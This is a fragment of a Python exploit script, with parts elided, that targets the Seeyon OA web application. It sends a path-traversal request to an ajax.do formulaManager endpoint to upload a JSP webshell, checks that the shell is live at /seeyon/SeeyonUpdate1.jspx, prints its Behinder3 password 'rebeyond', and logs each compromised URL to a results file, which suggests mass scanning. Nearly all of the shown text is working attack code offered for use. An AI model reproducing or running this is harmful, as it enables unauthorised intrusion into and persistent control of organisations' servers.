...
def exploit(url):
    exp_url = url + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
    print("[!]Upload Test: %s" % exp_url)
    headers = {
    ...
    webshell(url)
def webshell(url):
    shell_url = url + "/seeyon/SeeyonUpdate1.jspx"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=shell_url, timeout=10, verify=False)
        print("[!]Verify the webshell status : %s/seeyon/SeeyonUpdate1.jspx" % url)
        if response.status_code == 200:
            print("[+]Success! webshell : %s/seeyon/SeeyonUpdate1.jspx || behinder3 pass:rebeyond" % url)
            f = open("result.txt", "a+")
            l = url + "/seeyon/SeeyonUpdate1.jspx" + "\n"
            f.write(l)
            f.close()
        else:
            print("[-]Failed!")
